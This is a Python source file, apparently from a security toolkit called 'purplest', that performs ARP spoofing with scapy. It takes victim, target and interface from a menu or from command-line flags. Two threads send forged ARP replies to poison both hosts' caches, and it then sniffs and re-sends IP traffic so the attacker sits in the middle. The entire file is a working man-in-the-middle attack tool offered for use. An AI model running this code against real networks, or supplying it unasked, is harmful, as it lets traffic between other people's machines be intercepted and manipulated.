#!/usr/bin/env python3
# ARP Spoofing (Man-in-the-middle)

import argparse
from scapy.all import *
from scapy.all import ARP
from scapy.all import IP
import time
import threading
import sys
import signal

# Global flag to handle graceful termination
running = True

def arpSpoof(targetIp, spoofIp, iface):
    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
    while running:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, victimIp, targetIp, iface):
    if pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

def sniffAndForward(victimIp, targetIp, iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, victimIp, targetIp, iface), store=0, timeout=10)

def startAttack(victimIp, targetIp, iface):
    # Start ARP poisoning threads
    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
    # Start sniffing and forwarding packets
    sniffAndForward(victimIp, targetIp, iface)

def menu():
    RED = "\033[38;2;255;0;0m"
    RESET = "\033[0m"
    victimIp = input(f"{RED}\nHost IP: {RESET}")
    targetIp = input(f"{RED}Target IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    startAttack(victimIp, targetIp, interface)

def terminal():
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.\nUsage: purplest-arpspoof -v 192.168.1.10 -t 192.168.1.1 -i eth0")

    args = parser.parse_args()

    if args.victimip and args.targetip and args.interface:
        startAttack(args.victimip, args.targetip, args.interface)
    else:
        parser.error("Syntax error. Usage: purplest-arpspoof -v 192.168.1.10 -t 192.168.1.1 -i eth0")

def signalHandler(sig, frame):
    global running
    print("\nGracefully stopping attack...")
    running = False
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signalHandler)  
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
